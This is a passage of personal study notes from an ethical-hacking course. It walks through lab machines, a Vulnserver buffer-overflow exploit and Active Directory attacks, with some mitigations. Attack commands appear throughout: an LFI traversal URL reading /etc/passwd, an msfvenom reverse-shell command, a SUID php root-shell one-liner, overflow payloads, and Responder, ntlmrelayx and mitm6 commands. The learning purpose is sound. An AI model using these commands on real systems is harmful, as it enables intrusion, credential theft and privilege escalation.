<p> Here we find a <code>save.zip</code> file in the mounted directory. We try to <em>unzip</em> it but find that it is password <em>protected</em>. We try to <em>brute force</em> the .zip password using <code>fcrackzip -u -D -p ./rockyou.txt save.zip</code>. This will give us the cracked password using which we extract the <em>save.zip</em> file as <code>unzip save.zip -d ~/Desktop/save</code>. Inside it we will find a <em>private</em> RSA key and <em>To_Do</em> list which contains a reference to <em>config</em> file and the author's <em>love</em> for <em>Java</em>. The file is signed by some <em>JP</em>. </p>
<p> Next we use <strong>ffuf</strong> to enumerate directories on both servers hosted at port <em>80</em> and <em>8080</em> as <code>ffuf -u http://192.168.75.134:8080/FUZZ -w ./wordlist.txt</code>We find a <em>config.yml</em> file in one such directories on port <em>80</em> server which contains a credential <strong>bolt@I_love_java</strong>. Using the same we find a <em>BoltWire</em> <em>login</em> page on port <em>8080</em>. We look for exploits for <em>BoltWire</em> and find a <em>local file exclusion</em> one. We can then use this vulnerability to output the <code>/etc/passwd</code> file on the target machine after registering and becoming a authenticated user as <code>http://192.168.51.169/boltwire/index.php?p=action.search&amp;action=../../../../../../../etc/passwd</code> which outputs the <em>passwd</em> file. </p>
<p> Here we find a user named <strong>jeanpaul</strong>. Our first guess is that this might be the author of <em>To_Do</em> file. So, we try to <em>ssh</em> into target machine with <em>id_rsa</em> private key as <code>ssh -i id_rsa jeanpaul@192.168.75.134</code>. We find that the RSA key is <em>passphrase</em> protected. We try using the already discovered password <em>I_love_java</em> since the author also loves java. Bingo! we get a <em>shell</em> access on target as <em>jeanpaul</em>. </p>
<p> Now we check whether the <em>sudo</em> command is available on target and which commands can be executed as <em>sudo</em> using <code>sudo -l</code>. We get a list stating <strong>zip</strong> command can be used with <em>sudo</em> and that too <em>without</em> entering a password. This gives a nice opportunity for <em>privilege escalation</em>. We search <strong>GTFOBins</strong> for <em>exploit code</em> using <code>sudo zip</code> command and after executing the specified exploit code we gain <strong>root shell</strong> access on target machine. </p>
</li>
<li data-line="32">
<p><mark>Machine 4: <strong>Butler</strong></mark></p>
<p>  This machine is based on <em>Windows 10</em>. <em>NMAP</em> scan reveals a <strong>HTTP</strong> webserver on port <em>80</em> powered by <strong>Jenkins</strong>. Directory busting using <strong>Dirbuster</strong> and <strong>ffuf</strong> reveals no other hidden directories. We immediately shift our focus on Jenkins webserver and start looking for any known exploits. The few exploits that we find are <em>Authenticated RCE</em> and <em>File Inclusion</em> vulnerabilities. So, the first step is authenticating into the login page and only then we can use our exploits afterwards. We use <strong>BurpSuite</strong> <em>Intruder</em> to brute force common and default passwords and to our surprise we get a login for <strong>jenkins@jenkins</strong>.</p>
<p>  The next step is using <em>Jenkins</em> exploits in order to get a shell. Luckily, we get a <em>script shell</em> on the webserver under the <em>configuration</em> page. The shell accepts and executes commands in <strong>Groovy</strong> language. We google for a <em>reverse shell</em> script in Groovy and execute it to get a reverse shell on our machine. We get shell access as <strong>jenkins</strong> user. Now our goal is <em>privilege escalation</em> to get root access. We start by downloading <strong>WinPeas.exe</strong> program from our hosted webserver in order to <em>enumerate</em> our target.</p>
<p>  On running <em>WinPeas</em> and skimming through the output we find an interesting process namely <strong>WiseBootAssistant</strong> which is executed by <em>root</em> and is modifiable by <em>jenkins</em>. Also, the process suffers from <strong>Unquoted Service Path</strong> vulnerability. So, we could inject a reverse shell executable in the service path and restart the service so that it gets executed by root. We generate  a Windows reverse shell using <strong>msfvenom</strong> and place it in the unquoted service path as <em>Wise.exe</em>. We restart the <em>WiseBootAssistant</em> service using <code>sc stop WiseBootAssistant</code> and <code>sc start WiseBootAssistant</code>. This in turn executes our <em>Wise.exe</em> and we get a reverse shell with <strong>root access</strong>.<br>
</p>
</li>
<li data-line="40">
<p><mark>Machine 4: <strong>Black Pearl</strong></mark></p>
<p> This machine is a <em>Debian</em> based Linux Machine. <em>NMAP</em> scan reveals a <strong>nginx</strong> webserver at port <em>80</em> and a <strong>ISC BIND</strong> service at port <em>53</em> for interacting with <em>DNS service</em>. As usual we start by <em>directory busting</em> nginx webserver to find a <em>secret</em> downloadable file. The file tells us that we won't find anything with directory busting and its a <em>dead end</em>. We shift our focus to <em>ISC BIND</em> DNS service. We use <strong>dnsrecon</strong> to enumerate <em>DNS</em> services on our subnet using <code>dnsrecon -r 127.0.0.0/24 -n 192.168.75.136 -d abcd</code>. We find one record for <strong>blackpearl.tcm</strong>. We associate it with our target IP by appending <code>192.168.75.136  blackpearl.tcm</code> to the <code>/etc/hosts</code> file.</p>
<p> Now, when we visit <code>blackpearl.tcm</code> in our web browser we are directed to a new <em>webpage</em>. Using directory busting we find a new page at <code>blackpearl.tcm/navigate/</code> powered by <strong>Navigate CMS</strong>. We search for any known exploits for <em>Navigate CMS</em> and find one <em>Unauthenticated Login Bypass and RCE</em> which even has a module in <strong>Metasploit</strong>. In metasploit we set the <strong>RHOSTS</strong> to our <em>target ip</em> and <strong>VHOST</strong> to to <em>blackpearl.tcm</em>. Here <em>VHOST</em> stands for HTTP server Virtual Host. After running the exploit we a shell on the target with <strong>www-data</strong> user. Now, its time for privilege escalation. </p>
<p> We find that the <strong>sudo</strong> command isn't available. We start system enumeration using <strong>linPEAS.sh</strong>. Under the <strong>suid</strong> section we find certain <em>binaries</em> which have <em>suid</em> file permissions. This means even though we can execute those files they will run with <em>root privileges</em>. One such binary is <strong>php7.3</strong>. We search <strong>GTFOBins</strong> for any privilege escalation exploit code for <em>SUID PHP</em> binaries. We find one such exploit code <code>/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"</code> and execute it to get <em>root shell access</em> on target machine.<br>
</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Introduction to Exploit Development" class="heading" id="Introduction_to_Exploit_Development">Introduction to Exploit Development</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>In this section we will develop our own exploits for breaching the security of a machine. We will learn a very popular exploitation method, namely     <mark><strong>Buffer Overflows</strong></mark>. Another great tutorial is <a data-tooltip-position="top" aria-label="https://github.com/cris-m/Buffer-Overflow-Exploit-Development" rel="noopener" class="external-link" href="https://github.com/cris-m/Buffer-Overflow-Exploit-Development" target="_blank">👉Here!👈</a>.</p>
<p> A <strong>buffer</strong>, or <strong>data buffer</strong>, is an area of physical memory storage used to temporarily store data while it is being moved from one place to another. These buffers typically live in <em>RAM</em> memory. <strong>Buffer overflow</strong> is an anomaly that occurs when software writing data to a buffer overflows the <em>buffer’s capacity</em>, resulting in adjacent memory locations being <em>overwritten</em>. </p>
<p> An attacker can deliberately feed a carefully crafted <em>input</em> into a program that will cause the program to try and store that input in a <em>buffer</em> that isn’t large enough, <em>overwriting</em> portions of memory connected to the buffer space. If the memory layout of the program is <em>well-defined</em>, the attacker can deliberately overwrite areas known to contain <em>executable code</em>. The attacker can then replace this code with his own executable code, which can drastically change how the program is intended to work.</p>
</li>
<li data-line="6">
<p>The <em>anatomy</em> of computer memory is as <code>Kernel-&gt;Stack-&gt;Heap-&gt;Data-&gt;Text</code>. It is the <strong>Stack</strong> that stores temporary variables created by a function. In stack, variables are declared, stored and initialized during runtime. Whenever a <em>function</em> is called, its variables get memory allocated on the stack. The architecture of the <em>Stack</em> is depicted below:<br>
<span alt="Screenshot 2024-03-21 at 00-46-02 Ethical Hacking in 15 Hours - 2023 Edition - Learn to Hack! (Part 2).png" src="Screenshot 2024-03-21 at 00-46-02 Ethical Hacking in 15 Hours - 2023 Edition - Learn to Hack! (Part 2).png" class="internal-embed media-embed image-embed is-loaded"><img alt="Screenshot 2024-03-21 at 00-46-02 Ethical Hacking in 15 Hours - 2023 Edition - Learn to Hack! (Part 2).png" src="screenshot-2024-03-21-at-00-46-02-ethical-hacking-in-15-hours-2023-edition-learn-to-hack!-(part-2).png"></span><br>
Normally, when data is written to the buffer space, it starts at <em>ESP</em> and stops at the <em>EBP</em>. But in case of a buffer overflow attack, we <em>overflow</em> the actual buffer space and <em>overwrite</em> the <em>EIP</em>. This <em>EIP</em> is a pointer address which is used to point to certain instructions. By using a specially crafted payload we can use this EIP to point to our own malicious code like a <em>reverse shell</em> shellcode. This is how a buffer overflow attack can be used to execute malicious code on the target machines. </p>
</li>
<li data-line="10">
<p>There are <em>seven</em> general steps to conduct a <em>buffer overflow</em> attack:<br>
<strong>(i)</strong> <mark>Spiking</mark>: To find a vulnerable command, we will test each one of them and send a bunch of characters to see if we can overflow the buffer. If the program crashes, then the command might be vulnerable or otherwise we move on to the next command.<br>
<strong>(ii)</strong> <mark>Fuzzing</mark>: It is similar to Spiking but here we know what part is vulnerable whereas, in spiking, we test for vulnerable commands. Also, we try to determine the number of bytes it takes for the program to crash.<br>
<strong>(iii)</strong> <mark>Finding the Offset</mark>: Here we try to find the exact offset after which the buffer starts overwriting to the EIP. We achieve this using a specially crafted buffer payload with unique character patterns.<br>
<strong>(iv)</strong> <mark>Overwriting the EIP</mark>: After we have determined the offset for EIP address space, we can use this to write and execute our own instructions in the EIP though calculated buffer overflows.<br>
<strong>(v)</strong> <mark>Finding Bad Characters</mark>: Now that we can control the EIP value and specify which instruction to execute next, we can now generate our shellcode. But before generating the shellcode, we need to find the bad characters to know what characters are good/bad for the shellcode.<br>
<strong>(vi)</strong> <mark>Finding the Right Module</mark>: We now need to find the right module (that has no memory protection) in the program to inject our shellcode into so that we can get it to execute and achieve desired results.<br>
<strong>(vii)</strong> <mark>Using shellcode to get access</mark>: Now, we can easily generate our shellcode using msfvenom by specifying the platform, payload type, architecture and all the bad characters that the shellcode needs to exclude.</p>
</li>
<li data-line="19">
<p>To demonstrate a buffer overflow attack we will use <a data-tooltip-position="top" aria-label="https://github.com/stephenbradshaw/vulnserver" rel="noopener" class="external-link" href="https://github.com/stephenbradshaw/vulnserver" target="_blank">Vulnserver</a>. For memory debugging we will use <em>Immunity Debugger</em>. We start off by <strong><mark>spiking</mark></strong> the <em>Vulnserver</em> using various available commands to check which command is vulnerable. This can be achieved using a tool called <code>generic_send_tcp</code> which is used to spike commands using variables of incrementing sizes. We find that the server <em>crashes</em> when spiking <strong>TRUN</strong> command using <code>generic_send_tcp 192.168.75.132 9999 trun.spk 0 0</code>. Hence, its indicates that the <em>TRUN</em> command is vulnerable.</p>
</li>
<li data-line="21">
<p>Now, we need to <strong><mark>fuzz</mark></strong> this specific <em>TRUN</em> command to check how many <em>bytes</em> of data we actually need to crash the <em>Vulnserver</em>. We can achieve this by writing a custom python script that highlights the <em>payload size</em> at which the program crashed. This payload size can the then be used for designing a unique pattern payload to determine the offset of the <em>EIP</em>. </p>
</li>
<li data-line="23">
<p>Our next task is generating a <em>unique pattern</em> payload of fixed size to identify the <strong><mark>offset</mark></strong> for the EIP. This marks the <em>starting</em> bytes after which the buffer overflow starts overwriting the <em>EIP</em> which we can then use to execute our own set of instructions. We can generate that payload using <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 20500</code> command. We will then use this unique pattern to perform buffer overflow attack and note down the value of the EIP register.<br>
<span alt="19.png" src="19.png" class="internal-embed media-embed image-embed is-loaded"><img alt="19.png" src="19.png"></span><br>
This value can then be used for finding the offset to EIP register by using <code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 20500 -q 386F4337</code> command. In this case it comes out to be <mark>2003</mark> bytes.</p>
</li>
<li data-line="27">
<p>Now we can tailor our payloads to <strong><mark>overwrite</mark></strong> custom code on this <strong>EIP</strong> address which will then be executed by the machine. We can verify this by crafting a custom payload <code>payload = "A" * 2003 + "B" * 4</code>. When this payload is used for <em>buffer overflow</em> attack we get the following output in Immunity:<br>
<span alt="Pasted image 20240324140035.png" src="Pasted image 20240324140035.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20240324140035.png" src="pasted-image-20240324140035.png"></span><br>
This indicates that all the characters after <em>2003</em> bytes aka all <em>4</em> "<code>B</code>"s were written over the EIP address. (<code>42</code> is the <em>hexcode</em> for character "B").</p>
</li>
<li data-line="31">
<p>Next step is identifying all the <mark><strong>bad characters</strong></mark> on the target machine. <em>Bad characters</em> are the ones that must be detected and eliminated as they might interfere with the proper execution of the <em>exploit</em> or the injected <em>shellcode</em>. They can be <em>singled out</em> by sending the complete list of all such characters available <a data-tooltip-position="top" aria-label="https://repo.4pfsec.com/buffer-overflow/remote-buffer-overflow/finding-bad-characters" rel="noopener" class="external-link" href="https://repo.4pfsec.com/buffer-overflow/remote-buffer-overflow/finding-bad-characters" target="_blank">here</a>, to see which ones of these cause an error on the machine. </p>
<p> To achieve this we will use <em>addon script</em> called <a data-tooltip-position="top" aria-label="https://github.com/corelan/mona" rel="noopener" class="external-link" href="https://github.com/corelan/mona" target="_blank">mona.py</a> which is written in <em>python</em> and can be used to automate and speed up <em>specific searches</em> while developing exploits (typically for the Windows platform). First, we configure <em>mona's</em> working directory in <em>Immunity Debugger</em> using the following command: <code>!mona config -set workingfolder c:\Users\admin\Desktop\mona</code>. Now we can generate a bad character byte array using <code>mona</code> with the following command: <code>!mona bytearray -cpb "\x00"</code>. This will be stored in the working directory.</p>
<p> We will include this byte array in our attack payload and <em>restart</em> the buffer overflow attack. Now, we will analyze the <em>hexdump</em> of the ESP pointer to find all such bad characters. We can automate this search using <code>!mona compare -f c:\Users\admin\Desktop\mona\bytearray.bin -a 005FF910</code>. Here <code>-a 005FF910</code> is used to indicate the address of the <em>ESP Pointer</em>. This will point out all the bad characters, in our case <code>\x00</code> and <code>\x80</code>. Now, when generating a <em>reverse shell</em> shellcode, we will specify <em>msfvenom</em> to avoid using these characters <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.131 LPORT=1234 EXITFUNC=thread -a x86 -b "\x00" -f c</code></p>
</li>
<li data-line="37">
<p>Now we need to find the <mark><strong>right module</strong></mark> to attack. This includes any part of the target machine that does not have any sort of <em>memory protections</em>. Memory protections, such as <em>DEP</em>, <em>ASLR</em>, and <em>SafeSEH</em> can cause headaches. While these protections can be <em>bypassed</em>, they make overflow attacks <em>very hard</em>. We can check for all such vulnerable modules using <code>!mona modules</code>.<br>
This lists the various modules available and the one that stands out is <code>essfunc.dll</code> because it doesn't have any memory protections. </p>
<p> Now, we need to find the <em>opcode</em> equivalent of <strong>JMP ESP</strong>. We are using JMP ESP because our EIP will point to the JMP ESP location, which will jump to our malicious shellcode that we will inject later. This also be achieved using <em>mona</em> by executing the command <code>!mona jmp -r ESP -m "essfunc.dll"</code>. This will return the <em>addresses</em> which we can use as a <em>pointer</em> to our malicious shellcode. We select the first address, <code>625011AF</code>, and add it to our Python script. The new <em>payload</em> in our script is <code>payload = b"A" * 2003  + b"\xaf\x11\x50\x62" + b"\x90" * 32 + shellcode</code>. </p>
<p> Here, <code>b"&lt;string&gt;"</code> is used to convert <em>string</em> into <em>bytes</em> format, <code>"\xaf\x11\x50\x62"</code> is <em>JMP ESP</em> address backwards and in appropriate syntax called <em>Little Endian</em>, <code>"\x90"</code> is used to add <em>padding</em> because otherwise sometimes <em>exploit code</em> can interfere with our <em>return address</em> and not run properly. The <code>exploit</code> is obviously our malicious <em>shellcode</em>.</p>
</li>
<li data-line="44">
<p>Now, we will <mark><strong>use reverse shell shellcode</strong></mark> that we generated earlier in our script. Hence, <code>exploit = &lt;reverse shell shellcode&gt;</code>. Now, when we execute this script, the <em>JMP ESP</em> command will be executed in the <em>EIP</em> register, which will then point to our <em>malicious</em> code. This will generate a <em>reverse shell</em> to our machine which we can catch using <strong>netcat</strong>.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Active Directory Overview" class="heading" id="Active_Directory_Overview">Active Directory Overview</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>A <strong>directory</strong> is a <em>hierarchical</em> structure that stores information about objects on the network. A directory, in the most generic sense, is a comprehensive listing of objects. A phone book is a type of directory that stores information about people, businesses, and government organizations. Phone books typically record names, addresses, and phone numbers.</p>
</li>
<li data-line="2">
<p><strong>Active Directory (AD)</strong> is a <em>Microsoft</em> technology used to manage computers and other devices on a network. It is a primary feature of <em>Windows Server</em>, an operating system that runs both local and Internet-based servers.</p>
</li>
<li data-line="4"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><mark>Active Directory Domain Services</mark> is the main component of Active Directory. <em>AD DS</em> can be broken down into three main functions:</p>
<ul>
<li data-line="5"><strong>Directory service</strong> – A directory service provides methods for storing data in a structured way that makes administration and access easy. For example, Active Directory stores information on users, computers, and groups.</li>
<li data-line="6"><strong>Authentication Service</strong> – It is the process where Active Directory verifies a user’s credentials (username and password). The user’s credentials are stored in the Active Directory database.</li>
<li data-line="7"><strong>Authorization Service</strong> – It is the process that grants or denies a user to do something such as edit a file or access an application.</li>
</ul>
</li>
<li data-line="9">
<p><strong>Domain Controllers –</strong> A server that is running AD DS is called a domain controller. Domain controllers host and replicate the directory service database inside the forest. The directory service also provides services for managing and authenticating resources in the forest. These servers host essential services in AD DS, including the following: – <em>Kerberos Key Distribution Center</em> (<mark>kdc</mark>) – <em>NetLogon</em> (<mark>Netlogon</mark>) – <em>Windows Time</em> (<mark>W32time</mark>) – <em>Intersite Messaging</em> (<mark>IsmServ</mark>).</p>
</li>
<li data-line="11">
<p>The <em>Active Directory</em> directory service uses a <strong>Data Store</strong> for all directory information. This <em>data store</em> is often referred to as the <em>directory</em>. The directory contains information about objects such as users, groups, computers, domains, organizational units, and security policies. This information can be published for use by users and administrators.</p>
</li>
<li data-line="13">
<p>One of the prime targets when attacking a Active Directory is the <code>ntds.dit</code> file. It contains info about everything in the Active Directory such as <em>users</em>, <em>groups</em>, <em>computers</em>, <em>domains</em>, <em>organizational units</em>, and <em>security policies</em>. On top of that it stores the <em>password hashes</em> for every user in the AD. It is accessible only through the domain controller processes and protocols. It is stored by default in <code>%SystemRoot%\NTDS</code> folder on all domain controllers.</p>
</li>
<li data-line="15">
<p><strong>Domains</strong> are <em>container</em> objects. Domains are a collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains. In this way, each domain is an administrative boundary for objects.</p>
</li>
<li data-line="17">
<p>Domain <strong>trees</strong> are collections of domains that are grouped together in hierarchical structures. When you <em>add a domain</em> to a tree, it becomes a <em>child</em> of the tree root domain. The domain to which a child domain is attached is called the parent domain. A <strong>forest</strong> is a complete instance of <em>Active Directory</em>. Each forest acts as a <em>top-level</em> container in that it houses all domain containers for that particular Active Directory instance. A <em>forest</em> can contain one or more domain container objects, all of which share a common logical structure.<br>
<span alt="forest.jpg" src="forest.jpg" class="internal-embed media-embed image-embed is-loaded"><img alt="forest.jpg" src="forest.jpg"></span></p>
</li>
<li data-line="20">
<p><strong>Organizational units</strong>(<mark>OUs</mark>) are container objects. You use these container objects to arrange other objects in a manner that supports your administrative purposes. By arranging objects in organizational units, you make it easier to locate and manage them. </p>
</li>
<li data-line="22">
<p>AD <strong>objects</strong> serve as the fundamental building blocks of an Active Directory network. These objects represent various resources, including <em>users</em>, <em>computers</em>, <em>printers</em>, and more. Each AD object is defined by a set of information known as <strong>object attributes</strong>. For instance, a user object’s attributes might include their full name, telephone number, and address.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Active Directory Lab Build" class="heading" id="Active_Directory_Lab_Build">Active Directory Lab Build</h1><div class="heading-children"><div><p>This section involves setting up our own <strong>Active Directory</strong> which we will use for <em>exploit</em> practice. We need a <mark>Windows Server Machine</mark> to act as <em>Domain Controller</em> and two other <mark>Windows Enterprise/Professional Machines</mark> to act as users connected to that the Domain Controller. We follow <em>step by step</em> along the course videos to set up our machines and finally after everything is set up we move on to the exploitation part.</p></div><div><p><strong>Another important thing to note</strong>: The <em>IP</em> of the Domain Controller was getting frequently changed by the <em>DHCP</em> Server. This caused a lot of problems as the connected hosts use the Domain Controllers <em>IP</em> as their <em>IPv4 DNS</em> address. So, we have regularly update the <em>IPv4 DNS</em> address on hosts to match the <em>IP</em> of the Domain Controller or any attacks won't work.</p></div></div></div><div class="heading-wrapper"><h1 data-heading="Active Directory - Initial Attack Vectors" class="heading" id="Active_Directory_-_Initial_Attack_Vectors">Active Directory - Initial Attack Vectors</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>Once we have gained access to the <em>target's network</em>, there are multiple ways through which we can start attacking the <strong>AD</strong> and the <strong>devices</strong> connected to it. There is a great article listing some popular attacks <a data-tooltip-position="top" aria-label="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" rel="noopener" class="external-link" href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa" target="_blank">here!</a>.</p>
</li>
<li data-line="2">
<p>One such attack is <mark><strong>LLMNR and NetBios Poisoning</strong></mark>. <em>LLMNR</em> or <em>Link Local Multicast Name Resolution</em> is is a protocol based on the <em>Domain Name System</em> (DNS) packet format that allows both <em>IPv4</em> and <em>IPv6</em> hosts to perform name resolution for hosts on the same local link. It is used to identify hosts when DNS fails to do so. <em>NBT-NS</em> or <em>NetBIOS over TCP/IP Name Service</em> is just an older version of <em>LLMNR</em> which was used earlier. It was still available to support legacy devices. As of <em>2022</em> Microsoft has begun phasing out <em>LLMNR</em> and <em>NBT-NS</em> in favour a newer protocol called <em>mDNS</em>.</p>
</li>
<li data-line="4">
<p>The key flaw in <em>LLMNR</em> is that it exposes the user's <em>username</em> and <em>NTLMv2 password hash</em> when it is appropriately responded. This could be achieved using a tool called <strong>Responder</strong> which comes inbuilt in Kali. When a user lookups a host which cannot be resolved by the <em>DNS</em> service, it then uses <em>LLMNR</em> instead to resolve to that host. </p>
<p> This is where the <em>Responder</em> comes into action and by <em>duping</em> to authenticate the target machine to the host its looking for it instead steals the target's <em>username</em> and <em>NTLMv2 hash</em>. We use the command <code>responder -I eth0 rwdv </code> to set up <em>Responder Server</em> and when the target machine tries to connect to our IP we steal their credentials. These <em>hashes</em> can then be cracked using <strong>Hashcat</strong> to get the <em>plaintext</em> password and gain access to the target account.</p>
</li>
<li data-line="8">
<p>To defend against <em>LLMNR</em> attacks we can simply disable LLMNR and NBT-NS using Group Policy Editor at <code>Local Computer Policy -&gt; Administrative Templates -&gt; Network -&gt; DNS Client -&gt; Turn Off Multicast Name Resolution</code>. </p>
<p>  <em>NBT-NS</em> can be disabled at <code>Network Connections -&gt; Network Adapter Properties -&gt; TCP/IPv4 Properties -&gt; Advanced Tab -&gt; WINS tab -&gt; Disable NetBIOS over TCP/IP</code>.</p>
<p>  We can also <strong>Network Access Control</strong> to allow only verified <em>MAC's</em> to connect to ports on our computer as well as just using <em>Strong Passwords</em> by default.</p>
</li>
<li data-line="14">
<p>Another popular type of attack is <mark><strong>SMB Relay Attack</strong></mark>. This attack is similar to the <em>LLMNR</em> attack in sense that we use <em>Responder</em> to capture a user's <em>credentials</em> but instead of trying to <em>crack</em> those password hashes, we simply <strong>relay</strong> those credentials to other hosts on the network in hope of getting access. But there are <em>two prerequisites</em> for the <em>SMB Relay attack</em> to work:</p>
<p> <strong>(i)</strong> <em>SMB Signing</em> must be disabled on the target.<br>
<strong>(ii)</strong> Relayed user credentials must be <em>Admin</em> on that machine.</p>
</li>
<li data-line="19">
<p>There are multiple methods to detect whether <em>SMB Signing</em> is disabled or not. We could simply run a <strong>Nessus</strong> scan to detect whether SMB Signing is enabled or not. We could also use the various SMB Signing <em>checker scripts</em> available on <em>Github</em> to check for the same. Although the most common one is using <em>NMAP</em> with special script as <code>nmap -p- -T4 -A -v 192.168.75.0/24 --script=smb2-security-mode.nse</code>. This reveals that the <em>Domain Controller</em> has <code>SMB Signing enabled and required</code> whereas the <em>other hosts</em> have <code>SMB Signing Enabled but not required</code>.</p>
</li>
<li data-line="21">
<p>The SMB Relay attack involves the following steps:</p>
<p>  <strong>(i)</strong> The <code>/etc/responder/Responder.conf</code> file is modified by setting the <em>HTTP</em> and <em>SMB</em> option to off. This ensures that the <em>Responder</em> only listens to the target servers and doesn't respond to them. The response part is handled by another program called <code>ntlmrelayx.py</code>.<br>
<strong>(ii)</strong> The <em>Responder</em> is then initialized to capture any user <em>credentials</em> through <em>LLMNR</em> or <em>NBT-NS</em> Poisoning. The captured credentials are then passed on to <em>ntlmrelayx.py</em> application.<br>
<strong>(iii)</strong> The relay application <code>ntlmrelayx.py</code> is initialized. It is responsible for <em>relaying</em> the credentials captured by Responder to the hosts specified by the <em>target file</em>. This is done to gain account access on that target host. The command used is <code>ntlmrelayx.py -tf targets.txt -smb2support</code><br>
<strong>(iv)</strong> These <em>relayed</em> credentials are then used to <em>login</em> on the <em>target</em> machine and dumps the <em>password hashes</em> of all the <em>local</em> accounts available on that machine. The command can also be modified to perform various different tasks like spawning an <em>interactive SMB shell</em> just by appending a <code>-i</code> at the end of <code>ntlmrelayx.py</code> command. Other options can be used like <code>-e</code> to execute a <em>.exe</em> file, <code>-c</code> to execute a specified command like <code>-c "whoami"</code>. </p>
</li>
<li data-line="28">
<p>There are various ways to defend your <strong>AD</strong> against <em>SMB Relay</em> attacks like:</p>
<p> <strong>(i)</strong> Enabling <strong>SMB Signing</strong> on all devices. This makes the AD <em>immune</em> to such attacks but decreases the file transfer performance by almost <em>15-20%</em>.<br>
<strong>(ii)</strong> Disable <strong>NTLM</strong> authentication on network. Even though this can protect us from such attacks, if at any time the <em>Kerberos</em> system stops working we would have no other way to login to our machines.<br>
<strong>(iii)</strong> <strong>Limiting domain admins</strong> to specific tasks only. They can only log on to  only when the need DA over the hosts.<br>
<strong>(iv)</strong> <strong>Local Admin Restriction</strong> is another way through which we can prevent a lot of lateral movement even if one of the hosts gets compromised.</p>
</li>
<li data-line="35">
<p>Another way of <strong>getting a shell</strong> on the target host if we have <em>cracked</em> its password is by using a <em>Metasploit</em> module <code>exploit/windows/smb/psexec</code>. After setting up the required options we use the exploit to get a <em>meterpreter</em> shell on host. We could also use <strong>psexec</strong> exploit without Metasploit using the <strong>psexec.py</strong> script included with <em>Impacket</em> suite. Though the problem with <em>psexec</em> exploits in general is that are easily flagged by Antivirus softwares. So, we could also use <strong>wmiexec.py</strong> script and <strong>smbexec.py</strong> to get an interactive shell on target host using format <code>wmiexec.py/Domain:Password@&lt;Target IP&gt;</code>.</p>
</li>
<li data-line="37">
<p>Another great attack is the <mark><strong>IPv6 DNS Takeover</strong></mark>. This attack exploits the fact that even though most ADs support <em>both IPv4 and IPv6</em> addresses they mostly utilize <em>IPv4</em> addresses for communication whereas the <em>IPv6</em> addresses remains <em>unconfigured</em>. This gives us an opportunity where we can set up our own malicious <em>DHCPv6</em> server which assigns <em>IPv6</em> addresses to hosts on that network. </p>
<p>   Now, when hosts are <em>dual stacked</em> i.e. when they have both IPv6 and IPv4 addresses available they prefer using IPv6 over IPv4 for communication. Thus, now all of their <em>DNS</em> requests are redirected to our DNS server which can <em>redirect</em> hosts to our machine. Now, when a host wants to <em>authenticate</em> with the <em>Domain Controller</em> we can intercept this authentication request and steal <em>user credentials</em>. </p>
<p>   The stolen credentials can then be used to authenticate to the Domain Controller and enumerate it for any <em>sensitive info</em> about the Active Directory. This is a kind of <strong>Man in the Middle Attack</strong>.</p>
</li>
<li data-line="43">
<p>This attack can be performed using a tool can <strong><a data-tooltip-position="top" aria-label="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" rel="noopener" class="external-link" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank">mitm6</a></strong>. This tool is used for setting up a malicious <em>DHCPv6</em> server with the attacker's host as <em>default DNS server</em>. This spoofs all of the <em>DNS requests</em> on the network to attacker's machine which can then be used to steal <em>user credentials</em> during <em>authentication</em> requests. The command for using <em>mitm6</em> for spoofing DNS requests is: <code>sudo mitm6 -d Daddy.xyz</code>.</p>
<p>   Those stolen credentials can then relayed using <strong>ntlmrelayx</strong> to logon to the <em>Domain Controller</em> and enumerate it for any sensitive information about the AD. It can used to dump info about <em>domain users</em>, <em>computers</em>, <em>trusts</em> etc. This can be achieved using the command <code>ntlmrelayx.py -6 -t ldaps://192.168.75.148 -wh fakewpad.Daddy.xyz -l lootme.</code> The IP used in this command is that of the <em>Domain Controller</em>. </p>
<p>   It can also be used for <em>creating new users</em> having exclusive rights to modify <em>Access Control Lists</em> as well as <strong><a data-tooltip-position="top" aria-label="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" rel="noopener" class="external-link" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" target="_blank">Delegate Impersonation</a></strong> or <em>Delegate Access</em> attacks in which we can create a new host in the AD and use that to attack the Domain Controller.</p>
</li>
<li data-line="49">
<p>There are various ways to mitigate the <em>IPv6 DNS</em> Takeover attacks:</p>
<p>   <strong>(i)</strong> If the AD doesn't utilize <em>IPv6</em> internally the one of the safest way to prevent <strong>mitm6</strong> attack is by blocking <em>DHCPv6</em> traffic and incoming <em>router advertisements</em> in Windows Firewall via the <em>Group Policy</em>. Disabling <em>IPv6</em> entirely may have unwanted side effects.<br>
<strong>(ii)</strong> If <strong>WPAD</strong>(Windows Proxy Auto Discovery) is not in use internally, disable it via Group Policy and disabling the <em>WinHTTPAutoProxySvc</em> service.<br>
<strong>(iii)</strong> Relaying to <strong>LDAP</strong> and <strong>LDAPS</strong> can only be mitigated by enabling <em>LDAP Signing</em> and <em>LDAP channel binding</em>.<br>
<strong>(iv)</strong> Consider <em>Administrative</em> users to the <em>Protected</em> users group or marking their account <em>sensitive</em> so that it cannot be delegated, which will prevent any <em>impersonation</em> of that user via <em>delegation</em>.</p>
</li>
